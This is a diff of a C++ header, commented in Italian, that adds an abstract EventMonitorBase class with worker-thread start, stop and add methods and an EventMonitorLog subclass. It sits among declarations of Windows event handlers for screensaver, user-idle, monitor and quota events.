@@ -5,6 +5,30 @@
 // Definita dentro SM_Core.cpp, di cui questo file e' un include
 void TriggerEvent(DWORD, DWORD);
 
+class EventMonitorBase
+{
+public:
+	EventMonitorBase();
+	~EventMonitorBase();
+
+	void start();
+	void stop();
+	void add(JSONObject conf_json, EVENT_PARAM* event_param, DWORD event_id);
+
+protected:
+	virtual void onStart() = 0;
+	virtual void onRun() = 0;
+	virtual void onStop() = 0;
+	virtual void onAdd(JSONObject json, EVENT_PARAM* event_param, DWORD event_id) = 0;
+
+private:
+	HANDLE	hWorkerThread;
+	BOOL	bSemaphore;
+	DWORD	dwThreadId;
+	DWORD	wakeUpTime;
+	static DWORD WINAPI EventMonitorBaseThread(LPVOID lpParameter);
+};
+
 //---------------------------------------------------
 
 #define PR_WINDOW_MASK 1
@@ -22,6 +46,7 @@ typedef struct {
 	DWORD index;
 	BOOL found;
 } enum_win_par_struct;
+
 
 // screensaver
 void WINAPI EM_ScreenSaverAdd(JSONObject conf_json, EVENT_PARAM* event_param, DWORD event_id);
@@ -47,6 +72,16 @@ void WINAPI EM_UserIdlesStop();
 void WINAPI EM_MonEventAdd(JSONObject conf_json, EVENT_PARAM* event_param, DWORD event_id);
 void WINAPI EM_MonEventStart();
 void WINAPI EM_MonEventStop();
+
+class EventMonitorLog :
+	public EventMonitorBase
+{
+public:
+	void onStart() override;
+	void onRun() override;
+	void onStop() override;
+	void onAdd(JSONObject json, EVENT_PARAM* event_param, DWORD event_id) override;
+};
 
 
 // Quota events
